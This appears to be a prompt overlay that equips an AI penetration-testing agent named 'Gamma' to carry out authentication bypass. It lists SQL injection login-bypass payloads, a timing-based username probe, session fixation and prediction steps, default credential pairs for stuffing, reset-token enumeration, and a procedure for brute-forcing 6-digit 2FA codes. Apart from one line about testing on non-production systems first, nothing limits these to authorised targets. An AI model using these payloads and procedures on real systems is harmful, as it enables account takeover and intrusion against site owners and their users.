# Auth Bypass — Dynamic Overlay

## Metadata
- **Exploit Type**: auth_bypass
- **Applies To**: Gamma
- **Loading**: Appended when `exploit_type === "auth_bypass"`

---

## OVERLAY_CONTEXT

Authentication bypass targets flaws in login, session, or credential verification mechanisms. This overlay covers: SQLi login bypass, session fixation, credential stuffing, default credentials, and broken authentication logic.

---

## Login Bypass Payloads

### SQLi in Username/Password
```
admin'--
admin' OR '1'='1
' OR 1=1--
' OR '1'='1' -- -
admin'#
```

### No Password
```
Username: admin
Password: (leave empty)
Username: ' OR 1=1--
Password: (leave empty)
```

### Username Enumeration via Timing
```
admin' AND SLEEP(5)-- (if true: slow, if false: fast)
```

### Case Variation
```
Admin
ADMIN
AdMiN
administrator
```

---

## Session Attacks

### Session Fixation
```
1. Obtain valid session ID: GET /login
2. Set cookie: Cookie: PHPSESSID=attacker_controlled_id
3. Lure victim to authenticate with that session
4. Use authenticated session
```

### Session Prediction
```
Analyze session tokens for patterns:
- Sequential IDs: session_001, session_002
- Timestamps: sess_1700000000
- Weak encoding: base64(userid_timestamp)
```

---

## Credential Stuffing

### Common Credential Pairs
```
admin:admin
admin:password
admin:123456
test:test
user:user
admin:letmein
admin:qwerty
```

### Targeted Credential Pairs (from OSINT)
```
From LinkedIn/github: firstname.lastname
From data breaches: company_name + year
```

---

## Broken Auth Logic

### Password Reset Exploitation
```
1. Request reset for admin@target.com
2. Capture reset token from response or timing
3. Predict/enumerate reset tokens (weak RNG)
4. Reset admin password
```

### 2FA Bypass
```
1. Complete step 1 (enter username/password)
2. Intercept 2FA code request
3. Brute force 2FA code (000000-999999, 6 digits)
4. If rate limited: try 000001, 000002 sequentially
```

### Password Change Logic
```
Can you change admin's password by knowing only your own email?
POST /api/password-change
{ "current_password": "wrong", "new_password": "hacked" }
```

---

## Constraints

```
- ALWAYS test on non-production systems first
- For brute force / 2FA bypass: check rate limiting first
- Credential stuffing only works against accounts with weak passwords
- SQLi login bypass only works if backend uses unsanitized input in query
- Default credentials: always try admin:admin, test:test, etc. on appliances/interfaces
```

---

*Overlay version: 1.0*
